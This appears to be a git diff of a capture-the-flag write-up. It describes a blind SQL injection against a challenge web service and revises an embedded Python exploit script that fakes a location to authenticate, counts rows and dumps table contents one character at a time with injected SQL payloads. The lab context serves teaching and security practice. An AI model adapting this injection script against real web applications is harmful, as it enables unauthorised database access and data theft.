@@ -23,14 +23,13 @@ Using the technique showed in the blind sqli lecture I was now able to guess any
 Since I didn't know any of the database specific table names or where I would find the flag I just started with reading all the table names from the `information_schenma.tables` table.
 This took quiet a while since there were 64 rows in that table and the character guessing was not very fast.
 After reading all the table names I realised how I can count the rows in a table and that I could have gone in reverse to find the non default tables faster...  
-Next I did the same for the column names of the newly found table names and then started reading from the `brains` table because of the hint in the challenge description and because it contained only a single row.
-When I ran my script on the `model` column nothing came back, my first guess was that it was of a none character data type since I was only guessing for printable characters.
-So I started reading the `data_type` column of that column in the `information_schenma.columns` table which returned a very different result from what I was expecting and contained the flag.
-This is what came back from it.
+Next I did the same for the column names of the newly found table names and then counted the rows in each of those tables. Since the count for `locations` ran a long time without returning I skipped it and went for the contents of the other two tables.
+While there was nothing useful in the `interfaces` I found the flag within the `brains` table.
+This is what came back from the query on its `model` column.
 
     {"class_name": "Sequential", "keras_version": "2.1.6", "flag": "n0t_sur3_my_br4in_is_b3tt3r_than_a_dragonmint", config": [{"class_name": "Dense", "config": {"kernel_initializer": {"class_name": "VarianceScaling", "config": {"distribution": "uniform", "scale": 1.0, "seed": null, "mode": "fan_avg"}}, "name": "dense_7", "kernel_constraint": null, "bias_regularizer": null, "bias_constraint": null, "dtype": "float32", "activation": "relu", "trainable": true, "kernel_regularizer": null, "bias_initializer": {"class_name": "Zeros", "config": {}}, "units": 12, "batch_input_shape": [null, 8], "use_bias": true, "activity_regularizer": null}}, {"class_name": "Dense", "config": {"kernel_initializer": {"class_name": "VarianceScaling", "config": {"distribution": "uniform", "scale": 1.0, "seed": null, "mode": "fan_avg"}}, "name": "dense_8", "kernel_constraint": null, "bias_regularizer": null, "bias_constraint": null, "activation": "relu", "trainable": true, "kernel_regularizer": null, "bias_initializer": {"class_name": "Zeros", "config": {}}, "units": 8, "use_bias": true, "activity_regularizer": null}}, {"class_name": "Dense", "config": {"kernel_initializer": {"class_name": "VarianceScaling", "config": {"distribution": "uniform", "scale": 1.0, "seed": null, "mode": "fan_avg"}}, "name": "dense_9", "kernel_constraint": null, "bias_regularizer": null, "bias_constraint": null, "activation": "sigmoid", "trainable": true, "kernel_regularizer": null, "bias_initializer": {"class_name": "Zeros", "config": {}}, "units": 1, "use_bias": true, "activity_regularizer": null}}], "backend": "tensorflow"}"}
 
-And here is state of my exploit script after getting this information.
+This is my exploit script developed for this challenge. While executing it will only dump the flag you can see the commands executed to get to this point and their outputs in the comments of the main function.
 
     #!/usr/bin/env python3
     import requests
@@ -46,12 +45,6 @@ And here is state of my exploit script after getting this information.
     LAT_BOUNDS = (-90, 90)
     LNG_BOUNDS = (-180, 180)
     HEAD_QUARTERS = (-45.423975728378025, -157.47046238434746)
-
-    FORBIDDEN_CHARS = [
-        "'",
-        ";",
-        "\\",
-    ]
 
 
     def post_location(coords):
@@ -108,10 +101,13 @@ And here is state of my exploit script after getting this information.
         )
 
     def authenticate():
+        print("Authenticating with saved location")
         post_location(HEAD_QUARTERS)
         if SESSION.cookies.get('session') is None:
+            print("Saved authentication location not accepted, searching for valid location")
             lng = search_lng(0)
             lat = search_lat(lng)
+            print("Location found at {} E {} N".format(lng, lat))
             return post_location((lat, lng)).get('access')
 
 
@@ -132,20 +128,8 @@ And here is state of my exploit script after getting this information.
         })
 
 
-    def get_forbidden_chars():
-        forbidden_chars = {
-            'manufacturer': [],
-            'product': [],
-        }
-        for c in string.printable:
-            if post_usb('', c).status_code != 200:
-                forbidden_chars['manufacturer'].append(c)
-            if post_usb(c, '').status_code != 200:
-                forbidden_chars['product'].append(c)
-        return forbidden_chars
-
-
     def count_rows(tbl):
+        print("Counting rows in table {}".format(tbl))
         QUERY_FMT = "'OR {cnt}=(SELECT COUNT(*) FROM {tbl})) tmp #"
         cnt_found = False
         cnt = 0
@@ -162,10 +146,9 @@ And here is state of my exploit script after getting this information.
         QUERY_FMT = "'OR BINARY '{c}'=(SELECT MID({col},{pos},1) FROM {tbl} WHERE {cond} LIMIT {row},1)) tmp #"
         payload = QUERY_FMT.format(c=c, col=col, pos=pos, tbl=tbl, cond=cond, row=row)
         response = post_usb(payload, '')
-        try:
-            return response.json()['supported']
-        except:
+        if response.status_code != 200:
             return False
+        return response.json()['supported']
 
     def dump_value(col, tbl, cond, row):
         value = ""
@@ -188,6 +171,7 @@ And here is state of my exploit script after getting this information.
 
 
     def dump_column(col, tbl, cond):
+        print("Dumping values of {col} in table {tbl} where {cond} applies".format(col=col, tbl=tbl, cond=cond))
         values = []
         val = "bogus"
         row = -1
@@ -201,37 +185,41 @@ And here is state of my exploit script after getting this information.
     def main():
         authenticate()
 
-        dump_column('model', 'brains', 'true')
+        # get table names
+        # dump_column('table_name', 'information_schema.tables', 'true')
+        # [..., 'brains', 'interfaces', 'locations']
 
-        tables = [
-            {
-                'name': 'brains',
-                'columns': [
-                    'id',
-                    'model',
-                ],
-            },
-            {
-                'name': 'interfaces',
-                'columns': [
-                    'id',
-                    'product',
-                    'manufacturer',
-                ],
-            },
-            # {
-            #     'name': 'locations',
-            #     'columns': [],
-            # }
-        ]
-        dump_column('data_type', 'information_schema.colums', "table_name='brains' AND column_name='model'")
-        # for tbl in tables:
-        #     name = tbl['name']
-        #     print(name)
-        #     for col in tbl['columns']:
-        #         print(col)
-        #         dump_column('data_type', 'information_schema.colums', "table_name='{}' AND column_name='{}'".format(name, col))
-        #         columns = dump_column(col, name, 'true')
+        # get column names of the brains table
+        # dump_column('column_name', 'information_schema.columns', "table_name='brains'")
+        # ['id', 'model']
+
+        # get column names of the interfaces table
+        # dump_column('column_name', 'information_schema.columns', "table_name='interfaces'")
+        # ['id', 'product', 'manufacturer']
+
+        # get column names of the locations table
+        # dump_column('column_name', 'information_schema.columns', "table_name='locations'")
+        # ['id', 'longitude', 'latitude']
+
+        # get row count per table
+        # count_rows('brains')
+        # 1
+        # count_rows('interfaces')
+        # 4
+        # count_rows('locations')
+        # ... too many
+
+        # get contents of product column of the interfaces table
+        # dump_column('product', 'interfaces', 'true')
+        # ['B-ASIC MIND', 'Titan Brain', 'iAxe', 'iHammer']
+
+        # get contents of manufacturer column of the interfaces table
+        # dump_column('manufacturer', 'interfaces', 'true')
+        # ['MiningMind Inc.', 'MiningMind Inc.', 'Apple Corp.', 'Apple Corp.']
+
+        # get contents of model column of the brains table
+        dump_column('model', 'brains', 'true')
+        # the flag and a lot of extra stuff
 
     if __name__ == '__main__':
         main()
